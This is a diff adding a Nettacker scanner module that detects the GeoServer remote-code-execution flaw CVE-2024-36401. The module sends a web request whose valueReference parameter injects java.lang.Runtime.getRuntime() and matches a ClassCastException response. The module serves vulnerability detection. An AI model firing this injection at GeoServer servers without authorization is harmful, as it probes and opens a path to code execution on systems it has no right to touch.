@@ -1,0 +1,134 @@
+info:
+  name: geoserver_cve_2024_36401_vuln
+  author: Sankalp Bansal
+  severity: 9.8
+  description: >
+    CVE-2024-36401 is a critical vulnerability in GeoServer, an opensource
+    server that allows user to edit and share geospatial data. The Geoserver
+    library API passes property names as common-jsxpath library which can
+    execute arbitrary code when processing XPath expressions.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/cve-2024-36401
+    - https://github.com/Mr-xn/CVE-2024-36401
+    - https://www.bitsight.com/blog/geoserver-cve-2024-36401-tailoring-public-poc-enable-high-confidence-detection
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve_2024
+    - geoserver
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/geoserver/wfs?service=wfs&request=DescribeFeatureType"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+        response:
+          save_to_temp_events_only: get_valid_namespace_1
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: typeName=([a-zA-Z0-9_-]+%3A[a-zA-Z0-9_-]+)
+              reverse: false
+
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=dependent_on_temp_event[0]['content'][0]&valueReference=java.lang.Runtime.getRuntime%28%29"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+        response:
+          dependent_on_temp_event: get_valid_namespace_1
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "400"
+              reverse: false
+            content:
+              regex: "ClassCastException"
+              reverse: false
+
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/geoserver/wfs?service=wfs&request=DescribeFeatureType"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 443
+        response:
+          save_to_temp_events_only: get_valid_namespace_2
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: typeName=([a-zA-Z0-9_-]+%3A[a-zA-Z0-9_-]+)
+              reverse: false
+
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=dependent_on_temp_event[0]['content'][0]&valueReference=java.lang.Runtime.getRuntime%28%29"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 443
+        response:
+          dependent_on_temp_event: get_valid_namespace_2
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "400"
+              reverse: false
+            content:
+              regex: "ClassCastException"
+              reverse: false
